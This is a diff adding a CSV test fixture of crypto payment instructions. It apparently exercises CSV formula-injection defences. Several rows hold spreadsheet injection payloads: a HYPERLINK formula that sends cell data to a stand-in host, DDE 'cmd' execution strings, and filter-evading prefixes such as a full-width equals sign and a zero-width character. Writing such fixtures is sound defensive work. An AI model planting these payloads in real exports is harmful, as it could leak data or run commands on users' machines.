@@ -1,0 +1,16 @@
+instruction_id,created_at,amount,chain,token,to_address,tx_hash,transfer_index,provider_payment_id,due_by
+INS-3001,2026-10-22T05:20:00Z,250.00,ethereum,USDC,,,,,
+"=HYPERLINK(""https://example.invalid/?leak=""&A1,""Open"")",2026-10-22T05:21:00Z,10.00,,,,,,,
+ =1+1,2026-10-22T05:22:00Z,11.00,,,,,,,
+＝1+1,2026-10-22T05:23:00Z,12.00,,,,,,,
+​=1+1,2026-10-22T05:24:00Z,13.00,,,,,,,
+"	=cmd|' /C echo FICTIONAL'!A0",2026-10-22T05:25:00Z,14.00,,,,,,,
+@SUM(1+1)*cmd|' /C echo FICTIONAL'!A0,2026-10-22T05:26:00Z,15.00,,,,,,,
+-2+3+cmd|' /C echo FICTIONAL'!A0,2026-10-22T05:27:00Z,16.00,,,,,,,
+INS-3009,2026-10-22T05:28:00Z,=1+1,,,,,,,
+INS-3010,2026-10-22T05:29:00Z,-17.00,,,,,,,
+INS-3011,2026-10-22T05:30:00Z,1e3,,,,,,,
+INS-3012,2026-10-22T05:31:00Z,18.00,ethereum,USDC,,"0x1f8e11a6ea2dca0b1dfa896f2d440eedbbe9d959060c5bf1da9d45662e8b24b3
+=1+1",,,
+ops@example.com,2026-10-22T05:32:00Z,19.00,,,,,,,
+INS-3014,2026-10-22T05:33:00Z,20.00,,,,,,+cmd,
